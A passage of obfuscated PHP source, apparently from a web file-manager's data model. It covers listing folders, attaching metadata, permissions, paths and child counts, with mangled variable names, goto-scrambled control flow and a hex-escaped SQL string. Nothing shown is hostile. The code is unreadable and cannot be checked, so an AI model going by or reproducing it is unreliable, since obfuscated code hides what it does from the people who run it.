œêğ[107] => $b›á” œêğ[107]); $a¤Ó©Áò = Input::get($b›á” œêğ[407], $b›á” œêğ[7], $C‚±êÒ¯™, array_keys($b¨Ù¹ùÍ‡‹)); goto aÇÍÕÛÏÑ; aÛ¦ó‰²œŞ: } protected function _listDataApplyItem($f¥ÂŠÎ”ª’, $Eš×‡³ÃÛ‰ = false) { $DÎ‚õÉ”ëŒ = array($f¥ÂŠÎ”ª’); $this->_listDataApply($DÎ‚õÉ”ëŒ, $Eš×‡³ÃÛ‰); return $DÎ‚õÉ”ëŒ[0]; } protected function _listDataApply(&$aÓùá‚ë¢¬, $B†Ã®­ë» = false) { goto eŞÖ›ä×å ; D§ò¼í ÕÏ: $this->_listAppendPath($aÓùá‚ë¢¬); $this->_listAppendAuth($aÓùá‚ë¢¬); $this->_listAppendSourceInfo($aÓùá‚ë¢¬, $eº“éÁÆö‘); goto c¿†ß®É; A©ËàˆÊ½: $eº“éÁÆö‘ = array_unique($eº“éÁÆö‘); $this->_listSourceCache($aÓùá‚ë¢¬); if (!$B†Ã®­ë») { $this->_listAppendMeta($aÓùá‚ë¢¬, $eº“éÁÆö‘); $this->_listAppendFileMeta($aÓùá‚ë¢¬, $eº“éÁÆö‘); $this->_listAppendChildren($aÓùá‚ë¢¬, $eº“éÁÆö‘); } goto D§ò¼í ÕÏ; c¿†ß®É: $this->_listAppendUser($aÓùá‚ë¢¬); $this->_listFilterInfo($aÓùá‚ë¢¬, $B†Ã®­ë»); goto fäÑÔ¾¾ìŸ; eŞÖ›ä×å : $B‡Åæ›ß‰‰ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$aÓùá‚ë¢¬) { $aÓùá‚ë¢¬ = array(); return; } $eº“éÁÆö‘ = array_to_keyvalue($aÓùá‚ë¢¬, $B‡Åæ›ß‰‰[33], $B‡Åæ›ß‰‰[369]); goto A©ËàˆÊ½; fäÑÔ¾¾ìŸ: } protected function _listSourceCache($eÜœ›•–´Ã) { $D„…²²‡ª¶ =& $_SERVER[³‘’¼äÑ™ÔÍ]; foreach ($eÜœ›•–´Ã as $cÒ¸õ…ˆï) { self::$cacheSourceInfo[$D„…²²‡ª¶[410] . $cÒ¸õ…ˆï[$D„…²²‡ª¶[369]]] = $cÒ¸õ…ˆï; } } protected function _listFilterInfo(&$FŞ³Ò²ãÅ, $CÜ²Î¬¥° = false) { $aà‡ÀĞ¥»² =& $_SERVER[³‘’¼äÑ™ÔÍ]; foreach ($FŞ³Ò²ãÅ as &$eèìÚÑŠš) { $eèìÚÑŠš = $this->pathInfoFilter($eèìÚÑŠš); self::$cachePathInfo[$aà‡ÀĞ¥»²[411] . intval($CÜ²Î¬¥°) . $aà‡ÀĞ¥»²[412] . $eèìÚÑŠš[$aà‡ÀĞ¥»²[369]]] = $eèìÚÑŠš; } } protected function _listMake(&$Fè¢àÚ‰‘) { $cÃ½çÀÔ÷ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Fè¢àÚ‰‘[$cÃ½çÀÔ÷[74]] = array(); $Fè¢àÚ‰‘[$cÃ½çÀÔ÷[73]] = array(); foreach ($Fè¢àÚ‰‘[$cÃ½çÀÔ÷[354]] as $fèË®šŞíò) { $c ã†ÌìÜ = $fèË®šŞíò[$cÃ½çÀÔ÷[370]] == 1 ? $cÃ½çÀÔ÷[74] : $cÃ½çÀÔ÷[73]; $Fè¢àÚ‰‘[$c ã†ÌìÜ][] = $fèË®šŞíò; } unset($Fè¢àÚ‰‘[$cÃ½çÀÔ÷[354]]); } protected function _listAppendMeta(&$A×£§“ğ“ï, $eÈ¤ƒ‹œ‹) { goto fê°¾•â¯‹; C‘‡’‘Ì¦·: if (!$Dèš‡ßõ„) { return; } $FÉ“æËã = array($d¶ñÍÍ¨÷©[415], $d¶ñÍÍ¨÷©[416]); $EÈ•¶”²¹Ÿ = array(); goto f×µ¼ä–è; fê°¾•â¯‹: $d¶ñÍÍ¨÷© =& $_SERVER[³‘’¼äÑ™ÔÍ]; $B¦Ù”Å×è³ = array($d¶ñÍÍ¨÷©[383] => array($d¶ñÍÍ¨÷©[384], $eÈ¤ƒ‹œ‹)); $Dèš‡ßõ„ = Model($d¶ñÍÍ¨÷©[413])->field($d¶ñÍÍ¨÷©[414])->where($B¦Ù”Å×è³)->select(); goto C‘‡’‘Ì¦·; f×µ¼ä–è: foreach ($Dèš‡ßõ„ as $d°œåŒ–‡) { if (!isset($EÈ•¶”²¹Ÿ[$d°œåŒ–‡[$d¶ñÍÍ¨÷©[369]]])) { $EÈ•¶”²¹Ÿ[$d°œåŒ–‡[$d¶ñÍÍ¨÷©[369]]] = array(); } if (in_array($d°œåŒ–‡[$d¶ñÍÍ¨÷©[89]], $FÉ“æËã)) { continue; } $EÈ•¶”²¹Ÿ[$d°œåŒ–‡[$d¶ñÍÍ¨÷©[369]]][$d°œåŒ–‡[$d¶ñÍÍ¨÷©[89]]] = $d°œåŒ–‡[$d¶ñÍÍ¨÷©[359]]; } foreach ($A×£§“ğ“ï as &$Aˆ¯ÏŞß˜Ü) { $Aˆ¯ÏŞß˜Ü[$d¶ñÍÍ¨÷©[417]] = !1; if (isset($EÈ•¶”²¹Ÿ[$Aˆ¯ÏŞß˜Ü[$d¶ñÍÍ¨÷©[369]]])) { $Aˆ¯ÏŞß˜Ü[$d¶ñÍÍ¨÷©[417]] = $EÈ•¶”²¹Ÿ[$Aˆ¯ÏŞß˜Ü[$d¶ñÍÍ¨÷©[369]]]; } if ($this->fileIsLock($Aˆ¯ÏŞß˜Ü) && $Aˆ¯ÏŞß˜Ü[$d¶ñÍÍ¨÷©[376]]) { $FŸ§¼èàòê = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Aˆ¯ÏŞß˜Ü[$d¶ñÍÍ¨÷©[376]][$d¶ñÍÍ¨÷©[377]] = AuthModel::authDisable($Aˆ¯ÏŞß˜Ü[$d¶ñÍÍ¨÷©[376]][$d¶ñÍÍ¨÷©[377]], $FŸ§¼èàòê); $Aˆ¯ÏŞß˜Ü[$d¶ñÍÍ¨÷©[376]][$d¶ñÍÍ¨÷©[418]][$d¶ñÍÍ¨÷©[376]] = $Aˆ¯ÏŞß˜Ü[$d¶ñÍÍ¨÷©[376]][$d¶ñÍÍ¨÷©[377]]; } } goto EÌÌ™˜á±‰; EÌÌ™˜á±‰: } protected function _listAppendFileMeta(&$C‚ó ¾®ù, $f¦²éÈ×±”) { goto eé—ç‹ºì÷; EËŠ¥õğá: if (!$B©»ô¬†‚ë) { return; } $eÃ†Ä¸’Úƒ = array($cêÏñ±ïÊ­[420] => array($cêÏñ±ïÊ­[384], $B©»ô¬†‚ë)); $a—Ïšğ’ß¡ = $cêÏñ±ïÊ­[421]; goto eòÑÖó’¸İ; eé—ç‹ºì÷: $cêÏñ±ïÊ­ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $B©»ô¬†‚ë = array_to_keyvalue($C‚ó ¾®ù, $cêÏñ±ïÊ­[33], $cêÏñ±ïÊ­[419]); $B©»ô¬†‚ë = array_filter(array_unique($B©»ô¬†‚ë)); goto EËŠ¥õğá; B‘´Á½«ì¡: $aÔ£‘Ã„Ÿ = $aÔ£‘Ã„Ÿ ? $aÔ£‘Ã„Ÿ : array(); $B÷Éäôœó = array(); foreach ($aÔ£‘Ã„Ÿ as $Fì‹¯éÇ) { if (!isset($B÷Éäôœó[$Fì‹¯éÇ[$cêÏñ±ïÊ­[419]]])) { $B÷Éäôœó[$Fì‹¯éÇ[$cêÏñ±ïÊ­[419]]] = array(); } $B÷Éäôœó[$Fì‹¯éÇ[$cêÏñ±ïÊ­[419]]][$Fì‹¯éÇ[$cêÏñ±ïÊ­[89]]] = $Fì‹¯éÇ[$cêÏñ±ïÊ­[359]]; } goto a§¬•ÒØ¤; a§¬•ÒØ¤: foreach ($C‚ó ¾®ù as &$B¤É»ÔÃ§Ñ) { goto F±­”àœÛ; e¦ÊµËŒò: $e¶ Á‡™‚¥[$cêÏñ±ïÊ­[77]] = $B¤É»ÔÃ§Ñ[$cêÏñ±ïÊ­[77]]; $e¶ Á‡™‚¥[$cêÏñ±ïÊ­[28]] = $B¤É»ÔÃ§Ñ[$cêÏñ±ïÊ­[28]]; self::$cacheFileInfo[$cêÏñ±ïÊ­[425] . $a‰×˜å„ÔÙ] = $e¶ Á‡™‚¥; goto c¥×‰âÌÀœ; d™‹ôù¢›: if (isset($B¤É»ÔÃ§Ñ[$cêÏñ±ïÊ­[162]][$cêÏñ±ïÊ­[426]])) { $B¤É»ÔÃ§Ñ[$cêÏñ±ïÊ­[426]] = json_decode($B¤É»ÔÃ§Ñ[$cêÏñ±ïÊ­[162]][$cêÏñ±ïÊ­[426]], !0); unset($B¤É»ÔÃ§Ñ[$cêÏñ±ïÊ­[162]][$cêÏñ±ïÊ­[426]]); } goto bÙíïš¢Î²; c¥×‰âÌÀœ: unset($f›®ğÀ»Å‚[$a‰×˜å„ÔÙ][$cêÏñ±ïÊ­[75]]); $fã¾é„õõš = is_array($B÷Éäôœó[$a‰×˜å„ÔÙ]) ? $B÷Éäôœó[$a‰×˜å„ÔÙ] : array(); $B¤É»ÔÃ§Ñ[$cêÏñ±ïÊ­[162]] = array_merge($fã¾é„õõš, $f›®ğÀ»Å‚[$a‰×˜å„ÔÙ]); goto d™‹ôù¢›; F±­”àœÛ: $a‰×˜å„ÔÙ = $B¤É»ÔÃ§Ñ[$cêÏñ±ïÊ­[419]]; if (!$a‰×˜å„ÔÙ || !isset($f›®ğÀ»Å‚[$a‰×˜å„ÔÙ])) { continue; } $e¶ Á‡™‚¥ = $f›®ğÀ»Å‚[$a‰×˜å„ÔÙ]; goto e¦ÊµËŒò; bÙíïš¢Î²: } goto CŞÚ÷Óíè; eòÑÖó’¸İ: $f›®ğÀ»Å‚ = Model($cêÏñ±ïÊ­[422])->field($a—Ïšğ’ß¡)->where($eÃ†Ä¸’Úƒ)->select(); $f›®ğÀ»Å‚ = array_to_keyvalue($f›®ğÀ»Å‚, $cêÏñ±ïÊ­[419]); $aÔ£‘Ã„Ÿ = Model($cêÏñ±ïÊ­[423])->field($cêÏñ±ïÊ­[424])->where($eÃ†Ä¸’Úƒ)->select(); goto B‘´Á½«ì¡; CŞÚ÷Óíè: } protected function _listAppendSourceInfo(&$DÃë¢¯Û•İ, $Bò‰˜ğÙ—) { goto cëº»Õ÷”ø; cëº»Õ÷”ø: $eäÈÑÕòò =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!defined($eäÈÑÕòò[427])) { return; } $aº‰‚æš¼ = Model($eäÈÑÕòò[428])->listData(); goto A–â©‹†¬¤; A–â©‹†¬¤: $DŸÍèßÅÙí = Model($eäÈÑÕòò[392])->listData(); $E¥âğŞ¯¾ = Model($eäÈÑÕòò[381])->listData(); $cò²…™’˜ = Model($eäÈÑÕòò[429])->listSimple(); goto a×Òƒ«çñ; a×Òƒ«çñ: $EÎ¸š¨à§Ñ = array_to_keyvalue($aº‰‚æš¼, $eäÈÑÕòò[367]); $E†¬ÊÈÄ®È = array_to_keyvalue_group($DŸÍèßÅÙí, $eäÈÑÕòò[75], $eäÈÑÕòò[393]); $bâ–Úƒ²êö = array_to_keyvalue($E¥âğŞ¯¾, $eäÈÑÕòò[75]); goto E‡Ø²ÄÒóÈ; E‡Ø²ÄÒóÈ: $AØ²Ú“–¹ = array_to_keyvalue_group($cò²…™’˜, $eäÈÑÕòò[369]); foreach ($DÃë¢¯Û•İ as &$d¤®ƒˆÉÖ) { $d¤®ƒˆÉÖ[$eäÈÑÕòò[391]] = array($eäÈÑÕòò[430] => 0, $eäÈÑÕòò[431] => 0, $eäÈÑÕòò[432] => 0); if (isset($bâ–Úƒ²êö[$d¤®ƒˆÉÖ[$eäÈÑÕòò[369]]])) { $d¤®ƒˆÉÖ[$eäÈÑÕòò[391]][$eäÈÑÕòò[433]] = 1; $d¤®ƒˆÉÖ[$eäÈÑÕòò[391]][$eäÈÑÕòò[434]] = $bâ–Úƒ²êö[$d¤®ƒˆÉÖ[$eäÈÑÕòò[369]]][$eäÈÑÕòò[28]]; } if (isset($E†¬ÊÈÄ®È[$d¤®ƒˆÉÖ[$eäÈÑÕòò[369]]])) { $d¤®ƒˆÉÖ[$eäÈÑÕòò[391]][$eäÈÑÕòò[435]] = array(); foreach ($E†¬ÊÈÄ®È[$d¤®ƒˆÉÖ[$eäÈÑÕòò[369]]] as $AˆŠ˜ŠìïÖ) { $C‹æ¸ÇÂ–‚ = $EÎ¸š¨à§Ñ[$AˆŠ˜ŠìïÖ]; $d¤®ƒˆÉÖ[$eäÈÑÕòò[391]][$eäÈÑÕòò[435]][] = array($eäÈÑÕòò[436] => $C‹æ¸ÇÂ–‚[$eäÈÑÕòò[367]], $eäÈÑÕòò[386] => $C‹æ¸ÇÂ–‚[$eäÈÑÕòò[28]], $eäÈÑÕòò[437] => $C‹æ¸ÇÂ–‚[$eäÈÑÕòò[438]]); } } if (isset($AØ²Ú“–¹[$d¤®ƒˆÉÖ[$eäÈÑÕòò[369]]])) { $d¤®ƒˆÉÖ[$eäÈÑÕòò[391]][$eäÈÑÕòò[439]] = array(); foreach ($AØ²Ú“–¹[$d¤®ƒˆÉÖ[$eäÈÑÕòò[369]]] as $A‚µÌ†âì) { $d¤®ƒˆÉÖ[$eäÈÑÕòò[391]][$eäÈÑÕòò[439]] = array($eäÈÑÕòò[440] => $A‚µÌ†âì[$eäÈÑÕòò[441]], $eäÈÑÕòò[442] => $A‚µÌ†âì[$eäÈÑÕòò[443]], $eäÈÑÕòò[444] => $A‚µÌ†âì[$eäÈÑÕòò[369]], $eäÈÑÕòò[445] => $A‚µÌ†âì[$eäÈÑÕòò[446]], $eäÈÑÕòò[447] => $A‚µÌ†âì[$eäÈÑÕòò[448]]); } } } return $DÃë¢¯Û•İ; goto a¶Ù˜¯çñ ; a¶Ù˜¯çñ : } protected function _listAppendChildren(&$C©¦Åñ­, $FàÍ¥êóî) { goto AÑéç¤Èİ; d‡ÍËÄ°À: $CíòËØïö° = 1024 * 50; $C©¦Åñ­ = is_array($C©¦Åñ­) ? $C©¦Åñ­ : array(); $Fíì¢çò’ï = count($C©¦Åñ­); goto Añ§Õ×å„÷; AÑéç¤Èİ: $dòñ¦Ó½Ÿ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eàŠõ ÑŠá = $dòñ¦Ó½Ÿ[361]; $D´¥Ë†“ÉÕ = array(); goto d‡ÍËÄ°À; Añ§Õ×å„÷: $C²¼Àƒ†¥ƒ = $this->tablePrefix . $this->tableName; for ($bĞÀ¢èìõå = 0; $bĞÀ¢èìõå < $Fíì¢çò’ï; $bĞÀ¢èìõå++) { $b¹ƒ‡±¬íé = intval($C©¦Åñ­[$bĞÀ¢èìõå][$dòñ¦Ó½Ÿ[397]]); if ($C©¦Åñ­[$bĞÀ¢èìõå][$dòñ¦Ó½Ÿ[370]]) { $B³’ÌœéÉ = $C©¦Åñ­[$bĞÀ¢èìõå][$dòñ¦Ó½Ÿ[369]]; $eàŠõ ÑŠá .= "\x53\105\x4c\x45\103\x54\x20\52\x20\106\122\117\115\40\x28\123\x45\114\105\x43\x54\40\47{$B³’ÌœéÉ}\137\x68\141\163\106\151\x6c\145\x27\x20\x61\x73\40\x68\141\x73\54\x63\x6f\x75\x6e\x74\50\61\51\40\x61\163\40\x68\141\163\103\x6f\x75\156\164\40\x46\x52\x4f\x4d\x20\x60{$C²¼Àƒ†¥ƒ}\x60\x20\12\x9\11\11\x9\11\167\x68\x65\162\145\x20\x70\141\162\145\156\x74\x49\x44\75{$B³’ÌœéÉ}\40\x61\156\144\x20\151\x73\106\x6f\x6c\144\145\x72\75\60\40\x61\156\144\x20\x69\163\104\x65\x6c\145\164\145\75{$b¹ƒ‡±¬íé}\51\40\x61\163\x20\164\x62\x31\x5f{$B³’ÌœéÉ}\x20\165\156\151\157\156\x20\141\154\154\x20\12\11\x9\x9\11\11\123\x45\114\105\x43\124\40\52\40\x46\122\x4f\x4d\40\50\x53\x45\114\105\x43\x54\40\47{$B³’ÌœéÉ}\137\x68\141\163\106\x6f\x6c\144\145\162\x27\40\141\x73\40\150\141\x73\106\x69\x6c\x65\54\x63\x6f\x75\156\x74\x28\x31\x29\x20\141\x73\40\x68\141\163\x43\x6f\x75\x6e\x74\40\x46\x52\117\115\x20\140{$C²¼Àƒ†¥ƒ}\x60\x20\xa\x9\x9\x9\x9\11\167\150\x65\162\x65\40\x70\x61\x72\145\x6e\x74\111\104\75{$B³’ÌœéÉ}\40\141\x6e\x64\40\151\163\106\x6f\x6c\144\x65\x72\x3d\x31\40\x61\x6e\144\x20\151\x73\104\x65\154\x65\164\x65\75{$b¹ƒ‡±¬íé}\51\40\141\x73\x20\164\x62\62\x5f{$B³’ÌœéÉ}\x20\x75\156\x69\157\156\40\x61\154\154\x20"; } if ((strlen($eàŠõ ÑŠá) >= $CíòËØïö° || $bĞÀ¢èìõå == $Fíì¢çò’ï - 1) && $eàŠõ ÑŠá) { $eàŠõ ÑŠá = substr($eàŠõ ÑŠá, 0, -strlen($dòñ¦Ó½Ÿ[449])); $CÏÅ´ Ú ø = $this->query($eàŠõ ÑŠá); $D´¥Ë†“ÉÕ = array_merge($D´¥Ë†“ÉÕ, $CÏÅ´ Ú ø); $eàŠõ ÑŠá = $dòñ¦Ó½Ÿ[33]; } } $D´¥Ë†“ÉÕ = array_to_keyvalue($D´¥Ë†“ÉÕ, $dòñ¦Ó½Ÿ[450]); goto eï¸èµğß; eï¸èµğß: foreach ($C©¦Åñ­ as &$eì÷ŠÏôÓ) { if ($eì÷ŠÏôÓ[$dòñ¦Ó½Ÿ[370]]) { unset($eì÷ŠÏôÓ[$dòñ¦Ó½Ÿ[372]]); $eì÷ŠÏôÓ[$dòñ¦Ó½Ÿ[192]] = intval($D´¥Ë†“ÉÕ[$eì÷ŠÏôÓ[$dòñ¦Ó½Ÿ[369]] . $dòñ¦Ó½Ÿ[451]][$dòñ¦Ó½Ÿ[452]]); $eì÷ŠÏôÓ[$dòñ¦Ó½Ÿ[191]] = intval($D´¥Ë†“ÉÕ[$eì÷ŠÏôÓ[$dòñ¦Ó½Ÿ[369]] . $dòñ¦Ó½Ÿ[453]][$dòñ¦Ó½Ÿ[452]]); } } goto Dƒ²‚£¸ğ„; Dƒ²‚£¸ğ„: } protected function _listAppendAuth(&$Aå­¨ªô±©) { goto Dñ§”£Ë¤; aä¼®ˆ‹: $CĞ–£„–«ˆ = Model($eÜÀö£Å‹˜[454])->getSourceList($EÒ¾‘ƒªÓˆ, $aæÃÁÃëİã); foreach ($Aå­¨ªô±© as $FÛÒÑì½â¡ => &$E•êä³…÷Ë) { $E•êä³…÷Ë[$eÜÀö£Å‹˜[376]] = $CĞ–£„–«ˆ[$E•êä³…÷Ë[$eÜÀö£Å‹˜[369]]]; if (!$E•êä³…÷Ë[$eÜÀö£Å‹˜[376]] && $E•êä³…÷Ë[$eÜÀö£Å‹˜[371]] == self::TYPE_GROUP) { $E•êä³…÷Ë[$eÜÀö£Å‹˜[376]] = Action($eÜÀö£Å‹˜[455])->pathGroupAuthMake($E•êä³…÷Ë[$eÜÀö£Å‹˜[456]]); if (!$E•êä³…÷Ë[$eÜÀö£Å‹˜[376]] && !_get($GLOBALS, $eÜÀö£Å‹˜[457])) { $E•êä³…÷Ë[$eÜÀö£Å‹˜[189]] = !1; $E•êä³…÷Ë[$eÜÀö£Å‹˜[188]] = !1; } } if ($E•êä³…÷Ë[$eÜÀö£Å‹˜[376]]) { $E•êä³…÷Ë[$eÜÀö£Å‹˜[189]] = AuthModel::authCheckEdit($E•êä³…÷Ë[$eÜÀö£Å‹˜[376]][$eÜÀö£Å‹˜[377]]); $E•êä³…÷Ë[$eÜÀö£Å‹˜[188]] = AuthModel::authCheckView($E•êä³…÷Ë[$eÜÀö£Å‹˜[376]][$eÜÀö£Å‹˜[377]]); } $this->groupPathDisplay($E•êä³…÷Ë); } goto d† µ™ª™×; FïÅÔ¾Ù: foreach ($Aå­¨ªô±© as $E•êä³…÷Ë) { if ($E•êä³…÷Ë[$eÜÀö£Å‹˜[371]] == self::TYPE_GROUP) { $EÒ¾‘ƒªÓˆ[] = $E•êä³…÷Ë[$eÜÀö£Å‹˜[369]]; } } if (!$EÒ¾‘ƒªÓˆ) { return; } $aæÃÁÃëİã = array_to_keyvalue($Aå­¨ªô±©, $eÜÀö£Å‹˜[369]); goto aä¼®ˆ‹; Dñ§”£Ë¤: $eÜÀö£Å‹˜ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!defined($eÜÀö£Å‹˜[427])) { return; } $EÒ¾‘ƒªÓˆ = array(); goto FïÅÔ¾Ù; d† µ™ª™×: } public function groupPathDisplay(&$F³Ğô—½„È) { goto b‚“¤Á’Ğö; f«ŠÇ´¬‡Ø: $F³Ğô—½„È[$Fã‚Ùåø—Â[464]] = $DùÄÙ‡î¤ . $Cš¹¥”‹‡•[$Fã‚Ùåø—Â[391]][$Fã‚Ùåø—Â[369]]; goto c£¤ÉùåƒÖ; b‚“¤Á’Ğö: $Fã‚Ùåø—Â =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($F³Ğô—½„È[$Fã‚Ùåø—Â[371]] != self::TYPE_GROUP) { return; } $Cš¹¥”‹‡• = Model($Fã‚Ùåø—Â[458])->getInfo($F³Ğô—½„È[$Fã‚Ùåø—Â[456]]); goto cåÙÄº­Òº; A‹Şø‰†»—: $F³Ğô—½„È[$Fã‚Ùåø—Â[460]] = $Cš¹¥”‹‡•[$Fã‚Ùåø—Â[461]]; $F³Ğô—½„È[$Fã‚Ùåø—Â[380]] = $Cš¹¥”‹‡•[$Fã‚Ùåø—Â[459]]; $F³Ğô—½„È[$Fã‚Ùåø—Â[462]] = $Cš¹¥”‹‡•[$Fã‚Ùåø—Â[463]]; goto f«ŠÇ´¬‡Ø; cåÙÄº­Òº: $dàÌé™‘ç” = $this->parentLevelArray($Cš¹¥”‹‡•[$Fã‚Ùåø—Â[459]]); $DùÄÙ‡î¤ = $Fã‚Ùåø—Â[33]; foreach ($dàÌé™‘ç” as $dÒ­èï™„ï) { $E¡’Ó’‘„Ç = Model($Fã‚Ùåø—Â[458])->getInfo($dÒ­èï™„ï); $DùÄÙ‡î¤ .= $E¡’Ó’‘„Ç[$Fã‚Ùåø—Â[391]][$Fã‚Ùåø—Â[369]] . $Fã‚Ùåø—Â[47]; } goto A‹Şø‰†»—; c£¤ÉùåƒÖ: } protected function _listAppendPath(&$FÇì‘ã‘‰¡) { goto a‘ÆÈ°å‡µ; a‘ÆÈ°å‡µ: $fÁ‚«¬ğÆ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cƒ©®šÉ×Ó = array(); foreach ($FÇì‘ã‘‰¡ as &$Eé ”ƒéÖ™) { $cƒ©®šÉ×Ó[$Eé ”ƒéÖ™[$fÁ‚«¬ğÆ[369]]] = $Eé ”ƒéÖ™[$fÁ‚«¬ğÆ[28]]; $FßìÃ¶˜† = $this->parentLevelArray($Eé ”ƒéÖ™[$fÁ‚«¬ğÆ[459]]); array_shift($FßìÃ¶˜†); foreach ($FßìÃ¶˜† as $F‰Äåİïù) { if (!isset($cƒ©®šÉ×Ó[$F‰Äåİïù])) { $cƒ©®šÉ×Ó[$F‰Äåİïù] = 0; } } } goto câ·¸›¤‰Ù; bÑİ²àöà˜: $D­í•øæóÏ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($FÇì‘ã‘‰¡ as &$Eé ”ƒéÖ™) { goto a¯‚¹ñÆæ¾; Dˆ•ÄíË“Ï: if ($FßìÃ¶˜†) { $DÑËÍ·ùª .= $Eé ”ƒéÖ™[$fÁ‚«¬ğÆ[28]]; } if ($Eé ”ƒéÖ™[$fÁ‚«¬ğÆ[370]]) { $DÑËÍ·ùª .= $fÁ‚«¬ğÆ[8]; } $Eé ”ƒéÖ™[$fÁ‚«¬ğÆ[466]] = str_replace($fÁ‚«¬ğÆ[467], $fÁ‚«¬ğÆ[8], $DÑËÍ·ùª); goto F§ÕÏßÓÎ; a¯‚¹ñÆæ¾: $FßìÃ¶˜† = $this->parentLevelArray($Eé ”ƒéÖ™[$fÁ‚«¬ğÆ[459]]); $DÑËÍ·ùª = $this->_listAppendPathRoot($Eé ”ƒéÖ™, $FßìÃ¶˜†); foreach ($FßìÃ¶˜† as $F‰Äåİïù) { if (isset($cƒ©®šÉ×Ó[$F‰Äåİïù])) { $DÑËÍ·ùª .= $cƒ©®šÉ×Ó[$F‰Äåİïù] . $fÁ‚«¬ğÆ[8]; } } goto Dˆ•ÄíË“Ï; F§ÕÏßÓÎ: $FÓ„¨µÚ“£ = trim($Eé ”ƒéÖ™[$fÁ‚«¬ğÆ[466]], $fÁ‚«¬ğÆ[8]); if ($Eé ”ƒéÖ™[$fÁ‚«¬ğÆ[461]] == $fÁ‚«¬ğÆ[468] && $FÓ„¨µÚ“£) { $Eé ”ƒéÖ™[$fÁ‚«¬ğÆ[28]] = $FÓ„¨µÚ“£; } $this->_listAppendPathRecycle($Eé ”ƒéÖ™, $FßìÃ¶˜†, $D­í•øæóÏ); goto D¿Ö±·; D¿Ö±·: } goto AÓ„…˜Öù; câ·¸›¤‰Ù: $DÛ‘È» ğë = array(); foreach ($cƒ©®šÉ×Ó as $aÅ‚ˆ¹í÷ => $d¢×ø¨´Û) { if (!$d¢×ø¨´Û) { $DÛ‘È» ğë[] = $aÅ‚ˆ¹í÷; } } if ($DÛ‘È» ğë) { $FÊƒíÚÆİÓ = array($fÁ‚«¬ğÆ[383] => array($fÁ‚«¬ğÆ[384], $DÛ‘È» ğë)); if (count($DÛ‘È» ğë) == 1) { $D‰°ßÖÇ = $this->sourceInfo($DÛ‘È» ğë[0]); $D‰°ßÖÇ = is_array($D‰°ßÖÇ) ? array($D‰°ßÖÇ) : !1; } else { $D‰°ßÖÇ = $this->field($fÁ‚«¬ğÆ[465])->where($FÊƒíÚÆİÓ)->select(); } $Bô‰á¿õÉˆ = array_to_keyvalue($D‰°ßÖÇ, $fÁ‚«¬ğÆ[369], $fÁ‚«¬ğÆ[28]); $cƒ©®šÉ×Ó = array_merge_index($cƒ©®šÉ×Ó, $Bô‰á¿õÉˆ); } goto bÑİ²àöà˜; AÓ„…˜Öù: } private function _listAppendPathRecycle(&$cÆ”÷ïóòÆ, $C¾å£„Ñë³, $føŒ°‹è´) { goto A±”“²ùŠ; aÛ¢â†±°´: $cÆ”÷ïóòÆ[$fè°ÁŸÔ“[459]] = $fè°ÁŸÔ“[470] . implode($fè°ÁŸÔ“[47], array_slice($C¾å£„Ñë³, 1)) . $fè°ÁŸÔ“[47]; if ($cÆ”÷ïóòÆ[$fè°ÁŸÔ“[369]] == $føŒ°‹è´) { $cÆ”÷ïóòÆ[$fè°ÁŸÔ“[459]] = $fè°ÁŸÔ“[470]; $cÆ”÷ïóòÆ[$fè°ÁŸÔ“[461]] = $fè°ÁŸÔ“[468]; $cÆ”÷ïóòÆ[$fè°ÁŸÔ“[28]] = LNG($fè°ÁŸÔ“[469]); } $cÆ”÷ïóòÆ[$fè°ÁŸÔ“[471]] = $fè°ÁŸÔ“[472]; goto b²°Ó¨½Ûª; C¬¥â·ùÁ: $E¨Øñ£æâ– = explode($fè°ÁŸÔ“[8], trim($cÆ”÷ïóòÆ[$fè°ÁŸÔ“[466]], $fè°ÁŸÔ“[8])); $a½£¯ØîÛ­ = implode($fè°ÁŸÔ“[8], array_slice($E¨Øñ£æâ–, 2)); $cÆ”÷ïóòÆ[$fè°ÁŸÔ“[466]] = $fè°ÁŸÔ“[8] . LNG($fè°ÁŸÔ“[469]) . $fè°ÁŸÔ“[8] . ltrim($a½£¯ØîÛ­, $fè°ÁŸÔ“[8]); goto aÛ¢â†±°´; A±”“²ùŠ: $fè°ÁŸÔ“ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (intval($cÆ”÷ïóòÆ[$fè°ÁŸÔ“[371]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($føŒ°‹è´, $C¾å£„Ñë³) && $cÆ”÷ïóòÆ[$fè°ÁŸÔ“[369]] != $føŒ°‹è´) { return; } goto C¬¥â·ùÁ; b²°Ó¨½Ûª: } protected function _listAppendPathRoot(&$cĞß„¤¿ù, $b¿…›ö¥‰) { $eÔƒ°ˆÀ… =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f¾Å–†°ë¿ = $eÔƒ°ˆÀ…[33]; if ($cĞß„¤¿ù[$eÔƒ°ˆÀ…[371]] == self::TYPE_USER) { if (defined($eÔƒ°ˆÀ…[427]) && $cĞß„¤¿ù[$eÔƒ°ˆÀ…[456]] == USER_ID) { $f¾Å–†°ë¿ = LNG($eÔƒ°ˆÀ…[473]); if (!$b¿…›ö¥‰) { $cĞß„¤¿ù[$eÔƒ°ˆÀ…[28]] = $f¾Å–†°ë¿; } } else { $a¶¢¼ÌìÕ­ = Model($eÔƒ°ˆÀ…[474])->getInfoSimple($cĞß„¤¿ù[$eÔƒ°ˆÀ…[456]]); $f¾Å–†°ë¿ = LNG($eÔƒ°ˆÀ…[475]) . $eÔƒ°ˆÀ…[157] . $a¶¢¼ÌìÕ­[$eÔƒ°ˆÀ…[28]] . $eÔƒ°ˆÀ…[476]; } } else { if ($cĞß„¤¿ù[$eÔƒ°ˆÀ…[371]] == self::TYPE_GROUP) { $a¶¢¼ÌìÕ­ = Model($eÔƒ°ˆÀ…[458])->getInfoSimple($cĞß„¤¿ù[$eÔƒ°ˆÀ…[456]]); $f¾Å–†°ë¿ = $a¶¢¼ÌìÕ­[$eÔƒ°ˆÀ…[28]]; } else { if ($cĞß„¤¿ù[$eÔƒ°ˆÀ…[371]] == self::TYPE_SYSTEM) { $a¶¢¼ÌìÕ­ = 